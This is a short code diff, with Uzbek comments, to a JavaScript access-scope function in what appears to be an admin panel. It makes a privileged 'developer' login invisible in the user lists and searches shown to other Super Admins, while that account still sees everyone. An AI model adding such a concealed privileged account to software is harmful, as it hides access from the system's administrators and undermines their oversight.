@@ -133,7 +133,13 @@ const NONE = { id: -1 } // hech narsaga mos kelmaydigan filtr (birlik biriktiril
 
 // ── LIST/GET uchun Prisma `where` filtri (null = filtrsiz, hammasini ko'radi) ──
 export function scopeWhere(resource, user) {
-  if (isSuperAdmin(user)) return null
+  if (isSuperAdmin(user)) {
+    // "developer" hisobi boshqa Super Admin'larning ro'yxatida/qidiruvida umuman
+    // ko'rinmaydi (ro'yxatdan chetlatiladi — bu tahrirlash/o'chirishni cheklashdan
+    // TASHQARI, faqat ko'rinishni ham soddalashtiradi). Developer'ning o'zi — hammani ko'radi.
+    if (resource === 'users' && !isUnrestrictable(user)) return { login: { not: 'developer' } }
+    return null
+  }
   const role = user?.role
 
   if (role === OPERATOR) {
